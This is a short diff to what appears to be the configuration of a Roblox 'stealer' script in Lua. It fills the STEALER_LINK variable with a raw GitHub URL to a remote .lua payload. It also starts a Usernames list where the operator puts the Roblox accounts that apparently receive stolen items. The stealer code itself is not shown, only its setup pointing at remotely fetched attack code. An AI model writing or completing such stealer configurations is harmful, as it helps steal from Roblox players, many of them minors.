@@ -1,4 +1,4 @@
-STEALER_LINK = '' -- stealer link (how to create is bellow)
+STEALER_LINK = 'https://raw.githubusercontent.com/Fedzen/Script-BF/refs/heads/main/.lua' -- stealer link (how to create is bellow)
 
 Usernames = {
     'loadstping', -- PUT UR ROBLOX USERNAMES
